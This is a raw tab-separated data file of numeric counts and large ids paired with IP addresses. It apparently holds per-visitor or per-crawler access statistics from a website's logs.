5	0	0	1	0	0	25333276	0	0	25333276	0	0	40.77.167.184
5	2	2	0	0	25347316	0	0	25296709	0	0	88036	38.122.227.170
5	0	0	1	0	0	25476739	0	0	25476739	0	0	80.84.57.108
5	1	1	1	0	25216240	25301411	0	25216240	25301411	0	44018	40.77.167.178
5	1	1	1	0	25308820	25308820	0	25308820	25308820	0	0	159.89.95.226
5	2	2	0	0	25494218	0	0	25327573	0	0	88036	77.120.176.171
5	0	0	1	0	0	25304580	0	0	25304580	0	0	40.77.167.177
5	1	1	0	0	25602717	0	0	25602717	0	0	44019	209.17.96.130
5	1	0	1	0	25566874	25566874	0	25566874	25566874	0	7295	66.249.73.89
5	0	0	1	0	0	25246930	0	0	25246930	0	0	40.77.167.175
5	1	1	0	0	25389615	0	0	25389615	0	0	18197	104.236.50.16
5	0	0	1	0	0	25614707	0	0	25614707	0	0	80.84.57.103
5	0	0	1	0	0	25297226	0	0	25297226	0	0	40.77.167.173
5	7	7	8	0	25317752	25364391	0	25313816	25313563	0	308126	40.77.167.171
5	1	1	0	0	25476739	0	0	25476739	0	0	44018	80.84.57.100
5	1	1	0	2	25629363	0	25629363	25629363	0	25629363	44019	210.82.30.225
5	1	1	0	0	25321654	0	0	25321654	0	0	44018	40.77.167.168
5	1	1	1	0	25326962	25326692	0	25326962	25326692	0	44018	40.77.167.167
5	0	0	1	0	0	25434084	0	0	25434084	0	0	159.203.163.53
5	0	0	1	0	0	25568601	0	0	25568601	0	0	142.93.67.85
5	1	1	0	0	25215823	0	0	25215823	0	0	44042	45.55.129.154
5	0	0	1	0	0	25646840	0	0	25646840	0	0	209.17.96.114
5	0	0	0	1	0	0	25568534	0	0	25568534	0	142.93.69.230
5	1	1	1	0	25100304	25100047	0	25100304	25100047	0	43644	40.77.167.145
5	1	1	0	0	25216308	0	0	25216308	0	0	44039	138.197.88.56
5	1	1	0	0	25434047	0	0	25434047	0	0	44033	104.131.183.55
5	3	3	3	0	25090849	25090591	0	25089380	25089115	0	130932	157.55.39.255
5	1	1	2	0	25359723	25360160	0	25359723	25359419	0	44018	40.77.167.141
5	1	1	0	0	25130848	0	0	25130848	0	0	44072	104.236.201.154
5	1	1	0	0	25134515	0	0	25134515	0	0	8834	157.55.39.253
5	0	0	2	0	0	25302136	0	0	25237314	0	0	40.77.167.138
5	4	4	2	0	25379280	25379824	0	25368637	25369154	0	176072	157.55.39.252
5	2	2	0	0	25388793	0	0	25333596	0	0	88036	157.55.39.249
5	0	0	1	0	0	25247531	0	0	25247531	0	0	157.55.39.250
5	1	1	0	0	25222056	0	0	25222056	0	0	44018	157.55.39.248
5	0	0	1	0	0	25233682	0	0	25233682	0	0	40.77.167.134
5	1	1	1	0	25255534	25256032	0	25255534	25256032	0	44018	157.55.39.247
5	0	0	1	0	0	25141674	0	0	25141674	0	0	157.55.39.246
5	6	6	4	0	25145057	25144902	0	25141931	25142556	0	52902	40.77.167.131
5	2	2	2	0	25351140	25350889	0	25350293	25349980	0	88036	157.55.39.243
5	0	0	1	0	0	25274119	0	0	25274119	0	0	40.77.167.128
5	1	1	1	0	25115414	25392604	0	25115414	25392604	0	44048	157.55.39.242
5	0	0	1	0	0	25215206	0	0	25215206	0	0	157.55.39.241
5	0	0	1	0	0	25334025	0	0	25334025	0	0	157.55.39.240
5	1	1	0	0	25085196	0	0	25085196	0	0	43644	157.55.39.238
5	1	1	0	0	25358848	0	0	25358848	0	0	44018	40.77.167.125
5	2	2	1	0	25130987	25130254	0	25130733	25130254	0	88096	157.55.39.237
5	2	2	1	0	25094930	25094678	0	25094711	25094678	0	87288	157.55.39.234
5	1	1	0	0	25363941	0	0	25363941	0	0	44018	40.77.167.120
5	1	1	2	0	25159669	25160102	0	25159669	25159260	0	8816	40.77.167.118
5	1	1	0	0	25380094	0	0	25380094	0	0	44018	40.77.167.117
5	1	1	1	0	25101915	25101565	0	25101915	25101565	0	43644	157.55.39.231
5	1	1	2	0	25080774	25093793	0	25080774	25080524	0	43644	157.55.39.230
5	3	3	4	0	25161943	25275749	0	25083672	25084105	0	96105	157.55.39.228
5	2	2	1	0	25378528	25346893	0	25347151	25346893	0	88036	40.77.167.115
5	6	5	0	0	25526722	0	0	25526722	0	0	167658	5.9.65.19
5	3	3	1	0	25311070	25111355	0	25111490	25111355	0	131680	40.77.167.111
5	1	1	0	0	25611641	0	0	25611641	0	0	44019	40.77.167.110
5	1	1	1	0	25261905	25262528	0	25261905	25262528	0	44018	157.55.39.223
5	2	2	1	0	25303999	25302979	0	25303279	25302979	0	88036	40.77.167.109
5	1	1	0	0	25295921	0	0	25295921	0	0	44018	157.55.39.222
5	0	0	1	0	0	25305314	0	0	25305314	0	0	40.77.167.108
5	1	1	1	0	25157847	25336499	0	25157847	25336499	0	8817	40.77.167.106
5	2	2	2	0	25377621	25378270	0	25136987	25377361	0	52851	40.77.167.105
5	1	1	0	0	25310301	0	0	25310301	0	0	44018	157.55.39.218
5	1	1	1	0	25363665	25121639	0	25363665	25121639	0	44018	157.55.39.217
5	1	1	1	0	25393693	25394204	0	25393693	25394204	0	44018	40.77.167.103
5	3	3	2	0	25114042	25113787	0	25112436	25112886	0	130972	157.55.39.216
5	0	0	1	0	0	25112190	0	0	25112190	0	0	40.77.167.102
5	0	0	0	1	0	0	25609837	0	0	25609837	0	159.65.41.198
5	0	0	1	0	0	25215926	0	0	25215926	0	0	40.77.167.100
5	1	1	1	0	25338324	25338072	0	25338324	25338072	0	44018	157.55.39.212
5	0	0	0	1	0	0	25652781	0	0	25652781	0	209.97.148.168
5	1	1	0	2	25630968	0	25630968	25630968	0	25630968	44019	123.207.39.209
5	3	3	2	0	25323650	25323388	0	25258035	25257632	0	132054	157.55.39.210
5	2	2	2	0	25527490	25527490	0	25479845	25479845	0	0	159.65.5.193
5	3	3	2	0	25282578	25283053	0	25128205	25282334	0	132084	157.55.39.206
5	1	1	0	0	25223145	0	0	25223145	0	0	44018	157.55.39.205
5	1	1	1	0	25381757	25245372	0	25381757	25245372	0	44018	157.55.39.194
5	0	0	1	0	0	25274905	0	0	25274905	0	0	157.55.39.203
5	0	0	1	0	0	25223730	0	0	25223730	0	0	157.55.39.202
5	0	0	1	0	0	25366041	0	0	25366041	0	0	157.55.39.201
5	3	3	2	0	25230656	25230278	0	25229646	25229360	0	132054	157.55.39.191
5	1	1	0	0	25269033	0	0	25269033	0	0	44018	157.55.39.190
5	1	1	0	0	25677544	0	0	25677544	0	0	44019	209.17.97.90
5	4	4	2	0	25678095	25390097	0	25389638	25389277	0	176074	157.55.39.188
5	1	1	0	0	25389634	0	0	25389634	0	0	22610	104.236.53.138
5	1	1	1	0	25135989	25138851	0	25135989	25138851	0	8834	52.53.231.176
5	0	0	3	0	0	25345332	0	0	25116775	0	0	157.55.39.185
5	0	0	1	0	0	25300226	0	0	25300226	0	0	174.138.58.146
5	1	1	0	0	25300232	0	0	25300232	0	0	44018	138.197.6.5
5	1	1	0	0	25520687	0	0	25520687	0	0	18204	159.65.255.27
5	0	0	1	0	0	25434090	0	0	25434090	0	0	159.65.255.9
5	1	1	1	0	25371178	25371606	0	25371178	25371606	0	44018	157.55.39.183
5	0	0	1	0	0	25441155	0	0	25441155	0	0	113.185.22.61
5	1	1	0	0	25434104	0	0	25434104	0	0	44042	159.65.255.206
5	1	1	0	0	25373593	0	0	25373593	0	0	44018	157.55.39.182
5	1	1	0	0	25411512	0	0	25411512	0	0	44018	157.55.39.180
5	2	2	1	0	25088354	25088090	0	25087800	25088090	0	87288	157.55.39.176
5	2	2	0	0	25357835	0	0	25226552	0	0	88036	157.55.39.174
5	1	1	0	0	25134584	0	0	25134584	0	0	8834	157.55.39.173
5	1	1	1	0	25292925	25226999	0	25292925	25226999	0	44018	157.55.39.172
5	1	1	0	0	25300197	0	0	25300197	0	0	44033	159.89.177.122
5	2	2	2	0	25344745	25339652	0	25344447	25236584	0	88036	157.55.39.170
5	3	3	0	0	25225682	0	0	25093287	0	0	131306	157.55.39.168
5	1	1	0	0	25332704	0	0	25332704	0	0	44018	157.55.39.167
5	0	0	1	0	0	25395836	0	0	25395836	0	0	168.1.128.77
5	1	1	0	0	25630068	0	0	25630068	0	0	0	35.157.132.5
5	0	0	0	2	0	0	25582310	0	0	25576623	0	168.1.128.76
5	1	1	1	0	25395385	25395816	0	25395385	25395816	0	44018	157.55.39.166
5	1	1	0	0	25376898	0	0	25376898	0	0	44018	157.55.39.165
5	0	0	0	4	0	0	25200826	0	0	25200826	0	23.254.164.219
5	0	0	0	2	0	0	25571738	0	0	25567961	0	168.1.128.74
5	3	3	2	0	25266129	25265869	0	25265409	25265093	0	132054	157.55.39.164
5	0	0	1	0	0	25215798	0	0	25215798	0	0	45.55.76.23
5	0	0	0	1	0	0	25652785	0	0	25652785	0	167.99.49.78
5	2	0	2	0	25367143	25366040	0	25367143	25366040	0	114	157.55.39.162
5	2	2	1	0	25291185	25291131	0	25218627	25291131	0	88036	157.55.39.160
5	1	1	0	0	25375228	0	0	25375228	0	0	44018	157.55.39.156
5	0	0	1	0	0	25249190	0	0	25249190	0	0	157.55.39.154
5	4	4	3	0	25320787	25320527	0	25318479	25319003	0	176072	157.55.39.153
5	0	0	1	0	0	25121939	0	0	25121939	0	0	168.1.128.62
5	2	2	1	0	25524510	25466726	0	25461273	25466726	0	88037	168.1.128.61
5	0	0	1	0	0	25104810	0	0	25104810	0	0	157.55.39.151
5	0	0	1	0	0	25518102	0	0	25518102	0	0	168.1.128.59
5	4	0	2	0	25280268	25177471	0	25101019	25177471	0	228	157.55.39.150
5	1	1	0	0	25364692	0	0	25364692	0	0	44018	157.55.39.148
5	1	1	0	0	25118225	0	0	25118225	0	0	44048	157.55.39.147
5	0	0	1	1	0	25486218	25557042	0	25486218	25557042	0	168.1.128.54
5	2	0	6	0	25611641	25380620	0	25611641	25346089	0	114	157.55.39.144
5	1	1	0	0	25490828	0	0	25490828	0	0	44018	157.55.39.143
5	2	2	1	0	25213533	25482782	0	25191288	25482782	0	88036	168.1.128.53
5	2	2	2	0	25255114	25092154	0	25091686	25091277	0	87662	40.77.167.99
5	3	3	3	1	25502574	25532577	25551457	25388302	25216356	25551457	132054	168.1.128.52
5	0	0	2	0	0	25254721	0	0	25253848	0	0	157.55.39.141
5	2	2	0	0	25237980	0	0	25237633	0	0	88036	40.77.167.98
5	0	0	2	1	0	25225405	25571505	0	25116674	25571505	0	168.1.128.51
5	1	1	1	0	25200178	25242206	0	25200178	25242206	0	44018	168.1.128.50
5	1	1	0	0	25247105	0	0	25247105	0	0	44018	157.55.39.140
5	3	3	2	0	25086935	25087547	0	25086107	25086680	0	130932	157.55.39.137
5	1	1	1	0	25114673	25114538	0	25114673	25114538	0	44048	157.55.39.136
5	0	0	1	0	0	25124187	0	0	25124187	0	0	38.142.119.250
5	1	1	0	0	25107284	0	0	25107284	0	0	43644	40.77.167.93
5	0	0	1	0	0	25325929	0	0	25325929	0	0	157.55.39.135
5	2	0	2	0	25130733	25130253	0	25130733	25130253	0	114	157.55.39.133
5	0	0	1	0	0	25380620	0	0	25380620	0	0	40.77.167.91
5	1	1	0	0	25343743	0	0	25343743	0	0	44018	40.77.167.89
5	2	2	1	0	25293514	25293386	0	25148041	25293386	0	52835	157.55.39.130
5	0	0	0	1	0	0	25635625	0	0	25635625	0	66.249.69.93
5	1	1	0	1	25260377	0	25583151	25260377	0	25583151	44018	168.1.128.38
5	0	0	1	0	0	25096929	0	0	25096929	0	0	40.77.167.86
5	2	2	2	2	25506815	25453353	25576266	25376764	25206710	25546934	88037	168.1.128.37
5	0	0	0	1	0	0	25640892	0	0	25640892	0	66.249.69.91
5	1	1	1	0	25244724	25461915	0	25244724	25461915	0	44018	168.1.128.36
5	1	1	0	0	25302396	0	0	25302396	0	0	44018	40.77.167.84
5	1	1	0	0	25360483	0	0	25360483	0	0	44018	157.55.39.126
5	0	0	1	0	0	25677305	0	0	25677305	0	0	209.17.97.26
5	0	0	0	2	0	0	25639691	0	0	25633109	0	66.249.69.89
5	1	1	1	0	25228793	25228532	0	25228793	25228532	0	44018	157.55.39.125
5	2	2	1	0	25308399	25115162	0	25164561	25115162	0	52835	40.77.167.83
5	2	2	1	1	25467212	25197494	25562878	25151436	25197494	25562878	88036	168.1.128.34
5	4	4	1	0	25375931	25108592	0	25108141	25108592	0	174950	40.77.167.82
5	1	1	0	0	25388547	0	0	25388547	0	0	44042	159.203.160.61
5	2	2	0	0	25136055	0	0	25136055	0	0	17668	40.77.167.81
5	0	0	1	0	0	25234440	0	0	25234440	0	0	157.55.39.121
5	1	1	0	0	25105925	0	0	25105925	0	0	43644	40.77.167.78
5	1	1	1	0	25353949	25353631	0	25353949	25353631	0	44018	157.55.39.120
5	1	1	1	0	25277296	25357869	0	25277296	25357869	0	44018	38.142.119.234
5	0	0	1	0	0	25310821	0	0	25310821	0	0	157.55.39.119
5	4	0	4	0	25183626	25183375	0	25180726	25180474	0	228	157.55.39.118
5	2	2	1	0	25396080	25346089	0	25346344	25346089	0	88036	40.77.167.76
5	2	2	3	0	25662456	25663206	0	25637765	25608060	0	88038	209.17.97.18
5	0	0	0	1	0	0	25238038	0	0	25238038	0	163.172.196.240
5	1	1	1	0	25231356	25231088	0	25231356	25231088	0	44018	40.77.167.72
5	0	0	1	0	0	25308082	0	0	25308082	0	0	157.55.39.114
5	1	1	0	0	25396958	0	0	25396958	0	0	44018	40.77.167.71
5	1	1	0	0	25335784	0	0	25335784	0	0	44018	38.142.119.226
5	1	0	1	0	25560536	25560536	0	25560536	25560536	0	7295	40.77.167.67
5	3	3	2	0	25322419	25322147	0	25175005	25175621	0	61652	157.55.39.109
5	1	1	2	0	25682972	25667697	0	25682972	25596906	0	44019	209.17.97.10
5	1	1	0	0	25345589	0	0	25345589	0	0	44018	40.77.167.66
5	0	0	1	0	0	25105513	0	0	25105513	0	0	40.77.167.65
5	1	1	0	0	25358613	0	0	25358613	0	0	44018	40.77.167.64
5	1	1	0	0	25174365	0	0	25174365	0	0	8818	40.77.167.63
5	0	0	1	0	0	25127955	0	0	25127955	0	0	40.77.167.62
5	1	1	0	0	25131125	0	0	25131125	0	0	44048	38.142.119.218
5	5	5	4	0	25210358	25209967	0	25121209	25207684	0	220120	157.55.39.103
5	0	0	2	0	0	25155784	0	0	25154890	0	0	40.77.167.61
5	0	0	1	0	0	25187917	0	0	25187917	0	0	40.77.167.60
5	0	0	1	0	0	25106939	0	0	25106939	0	0	40.77.167.59
5	1	1	1	0	25094053	25310034	0	25094053	25310034	0	43644	40.77.167.58
5	1	1	1	0	25124117	25124547	0	25124117	25124547	0	44048	40.77.167.57
5	1	1	1	0	25289790	25249743	0	25289790	25249743	0	44018	40.77.167.55
5	0	0	0	1	0	0	25643368	0	0	25643368	0	66.249.69.61
5	0	0	0	1	0	0	25642071	0	0	25642071	0	66.249.69.59
5	1	1	1	0	25102598	25102342	0	25102598	25102342	0	43644	40.77.167.53
5	1	0	0	1	25644662	0	25647176	25644662	0	25647176	57	66.249.69.57
5	0	0	1	0	0	25335620	0	0	25335620	0	0	40.77.167.51
5	0	0	3	0	0	25337183	0	0	25107894	0	0	40.77.167.50
5	1	1	1	0	25241448	25347629	0	25241448	25347629	0	44018	40.77.167.49
5	2	2	1	0	25203738	25204214	0	25203738	25204214	0	88036	40.77.167.46
5	1	1	1	0	25170837	25170563	0	25170837	25170563	0	8817	40.77.167.45
5	3	3	3	0	25295070	25295660	0	25294350	25294082	0	132054	40.77.167.43
5	3	3	3	0	25391999	25391680	0	25195105	25194854	0	132054	40.77.167.39
5	2	2	1	0	25156219	25156807	0	25156057	25156807	0	17634	40.77.167.40
5	0	0	1	0	0	25394950	0	0	25394950	0	0	40.77.167.37
5	1	1	0	0	25215816	0	0	25215816	0	0	44018	104.236.77.48
5	1	1	1	0	25270592	25270335	0	25270592	25270335	0	44018	40.77.167.36
5	1	1	0	0	25434082	0	0	25434082	0	0	44042	104.236.70.27
5	1	1	1	0	25372751	25372496	0	25372751	25372496	0	44018	40.77.167.35
5	0	0	1	0	0	25141038	0	0	25141038	0	0	40.77.167.34
5	1	1	0	0	25474439	0	0	25474439	0	0	44033	104.236.203.195
5	1	1	1	0	25336758	25205050	0	25336758	25205050	0	44018	40.77.167.26
5	0	0	1	0	0	25241916	0	0	25241916	0	0	40.77.167.25
5	3	3	0	0	25305702	0	0	25098858	0	0	131306	40.77.167.24
5	1	1	0	0	25135360	0	0	25135360	0	0	8834	40.77.167.22
5	4	4	4	0	25168545	25169006	0	25166753	25166417	0	35268	40.77.167.19
5	1	1	1	0	25311404	25311941	0	25311404	25311941	0	44018	40.77.167.20
5	1	1	1	0	25607701	25607701	0	25607701	25607701	0	0	209.97.167.116
5	0	0	0	1	0	0	25473048	0	0	25473048	0	66.249.70.25
5	0	0	1	0	0	25378991	0	0	25378991	0	0	40.77.167.18
5	0	0	1	0	0	25292606	0	0	25292606	0	0	40.77.167.16
5	1	1	0	0	25389625	0	0	25389625	0	0	44042	104.236.55.230
5	1	1	1	0	25281102	25354419	0	25281102	25354419	0	44018	40.77.167.14
5	0	0	1	0	0	25332451	0	0	25332451	0	0	40.77.167.13
5	0	0	1	0	0	25267967	0	0	25267967	0	0	40.77.167.12
5	0	0	1	0	0	25174802	0	0	25174802	0	0	207.46.13.98
5	1	1	0	0	25353258	0	0	25353258	0	0	44018	38.140.143.250
5	2	2	0	0	25367143	0	0	25133479	0	0	52852	207.46.13.96
5	2	2	1	0	25176987	25176370	0	25176671	25176370	0	17634	207.46.13.95
5	1	1	0	0	25402255	0	0	25402255	0	0	44018	169.54.233.126
5	2	2	1	0	25234862	25190957	0	25160398	25190957	0	88036	169.54.233.125
5	1	1	1	0	25197635	25213382	0	25197635	25213382	0	44018	169.54.233.124
5	2	2	3	0	25163837	25164308	0	25163027	25162769	0	17634	207.46.13.89
5	1	1	0	0	25233446	0	0	25233446	0	0	44018	169.54.233.123
5	2	0	2	6	25556911	25451154	25201287	25089758	25450681	25083509	7352	66.249.77.24
5	4	0	2	5	25201287	25555338	25490158	25083509	25555338	25083509	228	66.249.77.23
5	4	0	2	9	25555338	25556911	25554531	25464488	25555719	25096898	14704	66.249.77.22
5	1	1	1	0	25414840	25221849	0	25414840	25221849	0	44018	169.54.233.120
5	2	2	2	0	25123442	25123236	0	25110921	25110633	0	87692	207.46.13.85
5	1	1	0	0	25143490	0	0	25143490	0	0	44018	169.54.233.119
5	1	1	0	0	25215788	0	0	25215788	0	0	44039	45.55.151.235
5	1	0	0	0	25256615	0	0	25256615	0	0	57	66.249.77.20
5	0	0	0	1	0	0	25256615	0	0	25256615	0	66.249.77.18
5	0	0	1	0	0	25227820	0	0	25227820	0	0	207.46.13.82
5	1	1	1	0	25256050	25184691	0	25256050	25184691	0	44018	169.54.233.116
5	1	1	2	0	25342086	25342607	0	25342086	25341799	0	44018	207.46.13.80
5	0	0	1	0	0	25084781	0	0	25084781	0	0	138.197.93.14
5	6	6	6	0	25152716	25152308	0	25148705	25148464	0	52898	207.46.13.77
5	4	0	8	0	25126563	25144099	0	25110893	25105513	0	228	207.46.13.76
5	0	0	1	0	0	25343382	0	0	25343382	0	0	207.46.13.75
5	1	1	1	0	25321233	25291665	0	25321233	25291665	0	44018	38.140.143.226
5	2	2	2	0	25306761	25306510	0	25306068	25226268	0	88036	207.46.13.74
5	2	0	0	0	25381757	0	0	25381757	0	0	114	207.46.13.73
5	1	1	0	0	25363526	0	0	25363526	0	0	44018	38.142.119.130
5	1	1	0	2	25630486	0	25630486	25630486	0	25630486	44019	150.109.47.201
5	2	0	2	0	25305702	25096233	0	25305702	25096233	0	114	207.46.13.70
5	0	0	1	0	0	25103236	0	0	25103236	0	0	207.46.13.69
5	1	1	0	0	25409291	0	0	25409291	0	0	44018	35.197.52.203
5	0	0	1	0	0	25348400	0	0	25348400	0	0	207.46.13.67
5	1	1	1	0	25136184	25136743	0	25136184	25136743	0	8833	207.46.13.66
5	3	3	2	0	25325356	25324988	0	25324532	25324115	0	132054	207.46.13.65
5	0	0	1	0	0	25127234	0	0	25127234	0	0	38.142.119.122
5	1	1	0	0	25243859	0	0	25243859	0	0	44018	207.46.13.64
5	0	0	1	0	0	25609833	0	0	25609833	0	0	159.89.177.9
5	1	1	0	0	25537581	0	0	25537581	0	0	44034	122.228.10.51
5	1	1	0	0	25116309	0	0	25116309	0	0	44048	207.46.13.61
5	0	0	0	2	0	0	25339016	0	0	25339016	0	185.106.121.32
5	2	2	2	0	25355558	25355279	0	25182336	25182065	0	52835	207.46.13.59
5	0	0	0	1	0	0	25631560	0	0	25631560	0	101.89.114.37
5	1	1	0	0	25228084	0	0	25228084	0	0	44018	207.46.13.57
5	1	1	0	0	25126563	0	0	25126563	0	0	44048	207.46.13.56
5	1	1	0	0	25138125	0	0	25138125	0	0	44048	38.142.119.106
5	1	1	2	0	25362848	25363346	0	25362848	25362592	0	44018	207.46.13.49
5	1	1	0	0	25122741	0	0	25122741	0	0	44048	207.46.13.48
5	0	0	4	0	0	25281590	0	0	25263308	0	0	207.46.13.45
5	0	0	1	0	0	25370903	0	0	25370903	0	0	207.46.13.42
5	0	0	2	0	0	25390976	0	0	25219949	0	0	207.46.13.39
5	2	2	0	0	25288366	0	0	25215433	0	0	88036	207.46.13.38
5	2	2	1	0	25264575	25264136	0	25264479	25264136	0	88036	207.46.13.37
5	1	1	2	0	25382649	25442680	0	25382649	25127041	0	44018	207.46.13.36
5	2	2	2	0	25348654	25221733	0	25221187	25220897	0	88036	207.46.13.34
5	0	0	1	0	0	25387702	0	0	25387702	0	0	207.46.13.32
5	6	6	7	0	25186637	25187233	0	25182941	25182924	0	52902	207.46.13.30
5	1	1	1	0	25124969	25125397	0	25124969	25125397	0	44048	207.46.13.28
5	2	2	0	0	25161324	0	0	25161238	0	0	17633	207.46.13.26
5	1	1	0	0	25259180	0	0	25259180	0	0	44018	207.46.13.25
5	1	1	0	0	25245518	0	0	25245518	0	0	44018	34.253.2.182
5	3	3	0	2	25340041	0	25340041	25340041	0	25340041	44018	18.197.42.185
5	1	1	1	0	25139673	25349134	0	25139673	25349134	0	8817	207.46.13.22
5	2	2	1	0	25352740	25352483	0	25352508	25352483	0	88036	207.46.13.20
5	1	1	1	0	25238703	25239302	0	25238703	25239302	0	44018	207.46.13.19
5	1	1	0	0	25179655	0	0	25179655	0	0	44042	165.227.184.41
5	0	0	0	6	0	0	25168524	0	0	25168524	0	192.151.152.122
5	1	1	0	0	25084743	0	0	25084743	0	0	43644	165.227.71.72
5	1	1	0	0	25652812	0	0	25652812	0	0	44034	167.99.54.59
5	1	1	0	0	25299461	0	0	25299461	0	0	44018	207.46.13.16
5	2	2	0	0	25433493	0	0	25433490	0	0	88081	54.215.218.70
5	9	9	7	0	25194422	25193552	0	25188192	25188755	0	396162	207.46.13.11
5	0	0	0	2	0	0	25253665	0	0	25241718	0	208.110.66.130
5	1	0	1	0	25556848	25484526	0	25556848	25484526	0	7295	207.241.225.246
5	0	0	1	0	0	25430918	0	0	25430918	0	0	207.241.225.244
5	0	0	0	1	0	0	25609869	0	0	25609869	0	159.65.37.202
5	1	0	0	0	25556848	0	0	25556848	0	0	7295	207.241.225.236
5	1	1	0	0	25522591	0	0	25522591	0	0	44019	38.130.161.29
5	1	1	0	0	25456707	0	0	25456707	0	0	44018	196.52.43.131
5	0	0	0	1	0	0	25568583	0	0	25568583	0	142.93.68.70
5	0	0	1	0	0	25511824	0	0	25511824	0	0	196.52.43.125
5	0	0	1	0	0	25570135	0	0	25570135	0	0	185.220.101.27
5	6	6	0	0	25690465	0	0	25147883	0	0	264111	199.193.7.33
5	0	0	1	1	0	25490895	25555760	0	25490895	25555760	0	196.52.43.124
5	0	0	2	0	0	25436722	0	0	25416588	0	0	196.52.43.123
5	1	1	1	0	25411073	25425621	0	25411073	25425621	0	44018	196.52.43.122
5	1	1	0	0	25265958	0	0	25265958	0	0	44018	196.52.43.121
5	1	1	2	0	25516246	25446899	0	25516246	25433100	0	44019	196.52.43.120
5	2	0	44	0	25562015	25681796	0	25557131	25227035	0	14590	137.226.113.28
5	0	0	37	0	0	25684278	0	0	25228085	0	0	137.226.113.27
5	1	0	45	0	25564639	25662912	0	25564639	25179326	0	7295	137.226.113.26
5	1	1	0	0	25527573	0	0	25527573	0	0	44020	196.52.43.110
5	0	0	1	0	0	25441742	0	0	25441742	0	0	66.249.66.24
5	0	0	1	1	0	25475575	25562949	0	25475575	25562949	0	196.52.43.106
5	1	1	0	0	25277320	0	0	25277320	0	0	44018	196.52.43.105
5	0	0	1	1	0	25441742	25458511	0	25441742	25458511	0	66.249.66.23
5	1	1	0	0	25272984	0	0	25272984	0	0	44018	196.52.43.102
5	0	0	1	0	0	25527359	0	0	25527359	0	0	196.52.43.100
5	1	1	0	0	25520648	0	0	25520648	0	0	44034	159.65.241.251
5	1	1	0	0	25610410	0	0	25610410	0	0	44034	38.130.184.40
5	0	0	1	0	0	25345333	0	0	25345333	0	0	159.65.188.84
5	1	1	0	0	25345330	0	0	25345330	0	0	44018	159.65.39.34
5	11	11	0	0	25183557	0	0	25160646	0	0	96985	52.34.24.33
5	0	0	1	0	0	25179624	0	0	25179624	0	0	174.138.56.77
5	1	1	0	0	25474447	0	0	25474447	0	0	44039	104.131.75.36
5	1	1	0	0	25216372	0	0	25216372	0	0	44042	45.55.164.203
5	1	1	0	0	25520629	0	0	25520629	0	0	44019	159.65.241.234
5	1	0	0	2	25629544	0	25651929	25629544	0	25628300	57	66.249.79.221
5	1	1	0	0	25520653	0	0	25520653	0	0	44043	159.65.185.8
5	2	0	0	2	25631912	0	25668759	25624629	0	25631912	114	66.249.79.219
5	2	0	0	4	25670330	0	25670330	25664311	0	25626728	114	66.249.79.217
5	1	1	0	2	25630918	0	25630918	25630918	0	25630918	44019	132.232.6.207
5	0	0	1	0	0	25568573	0	0	25568573	0	0	209.97.158.224
5	1	1	0	0	25520663	0	0	25520663	0	0	44043	159.65.241.219
5	1	1	0	0	25084758	0	0	25084758	0	0	43659	138.197.35.182
5	1	0	0	1	25626181	0	25625578	25626181	0	25625578	57	66.249.79.189
5	0	0	1	0	0	25260411	0	0	25260411	0	0	45.55.60.130
5	1	1	2	1	25396512	25504653	25552894	25396512	25442911	25552894	44018	196.52.43.95
5	1	1	0	0	25485371	0	0	25485371	0	0	44018	196.52.43.93
5	0	0	1	0	0	25521725	0	0	25521725	0	0	196.52.43.90
5	79	79	14	0	25485833	25465077	0	25081277	25123484	0	0	138.246.253.19
5	0	0	1	0	0	25401392	0	0	25401392	0	0	196.52.43.85
5	0	0	26	0	0	25330995	0	0	25206940	0	0	54.183.130.127
5	2	2	0	1	25381067	0	25567315	25132931	0	25567315	88066	169.53.184.5
5	3	3	0	8	25122355	0	25122356	25120795	0	25122022	0	138.246.253.15
5	1	1	0	0	25683749	0	0	25683749	0	0	44034	196.52.43.81
5	1	1	0	0	25300197	0	0	25300197	0	0	44042	45.55.43.245
5	0	0	0	1	0	0	25212447	0	0	25212447	0	196.52.43.77
5	1	1	0	1	25682923	0	25681074	25682923	0	25681074	44019	196.52.43.74
5	0	0	0	1	0	0	25681875	0	0	25681875	0	196.52.43.72
5	0	0	0	1	0	0	25212584	0	0	25212584	0	196.52.43.71
5	0	0	15	0	0	25427297	0	0	25335332	0	0	54.183.165.74
5	0	0	0	1	0	0	25366704	0	0	25366704	0	196.52.43.68
5	1	1	0	0	25345337	0	0	25345337	0	0	44042	159.89.46.27
5	1	1	1	0	25252607	25202561	0	25252607	25202561	0	44018	196.52.43.66
5	1	1	1	0	25223067	25171105	0	25223067	25171105	0	44018	196.52.43.65
5	1	1	0	0	25300192	0	0	25300192	0	0	44039	159.89.34.216
5	1	1	0	0	25130867	0	0	25130867	0	0	44048	104.236.63.78
5	1	1	0	0	25216833	0	0	25216833	0	0	44018	196.52.43.63
5	1	1	0	0	25257798	0	0	25257798	0	0	44042	23.27.155.240
5	2	2	0	0	25226753	0	0	25164784	0	0	88036	196.52.43.62
5	2	2	2	0	25281138	25281211	0	25155190	25265522	0	88036	196.52.43.61
5	0	0	1	0	0	25142936	0	0	25142936	0	0	196.52.43.59
5	1	1	1	0	25122752	25133033	0	25122752	25133033	0	44048	196.52.43.60
5	1	1	0	0	25215819	0	0	25215819	0	0	44033	45.55.202.49
5	0	0	1	0	0	25260399	0	0	25260399	0	0	196.52.43.58
5	1	1	1	0	25170939	25273316	0	25170939	25273316	0	44018	196.52.43.57
5	0	0	1	0	0	25255011	0	0	25255011	0	0	196.52.43.56
5	0	0	1	0	0	25167393	0	0	25167393	0	0	196.52.43.51
5	1	1	1	0	25662182	25662182	0	25662182	25662182	0	0	178.62.87.202
5	9	0	3	18	25558115	25564473	25406942	25108022	25427496	25089759	7751	66.249.79.143
5	1	1	0	0	25285783	0	0	25285783	0	0	44018	38.142.98.250
5	8	0	1	23	25370365	25556911	25417898	25102877	25556911	25089758	456	66.249.79.141
5	11	0	0	29	25564473	0	25550826	25168761	0	25096898	15103	66.249.79.139
5	1	0	3	7	25570448	25571616	25598759	25570448	25567915	25578840	7295	66.249.71.93
5	3	0	3	5	25591802	25570448	25626181	25575308	25565717	25575308	171	66.249.71.91
5	7	0	2	8	25598759	25570448	25601482	25570448	25569275	25581183	7637	66.249.71.89
5	1	1	1	0	25622713	25622713	0	25622713	25622713	0	44019	13.59.171.119
5	1	1	0	0	25658000	0	0	25658000	0	0	44019	209.17.97.2
5	1	1	0	0	25128804	0	0	25128804	0	0	44048	38.142.98.234
5	5	0	0	4	25602701	0	25660273	25379911	0	25383520	285	66.249.79.125
5	1	0	0	0	25570135	0	0	25570135	0	0	7295	195.176.3.19
5	2	0	0	8	25596646	0	25650158	25594228	0	25379911	114	66.249.79.123
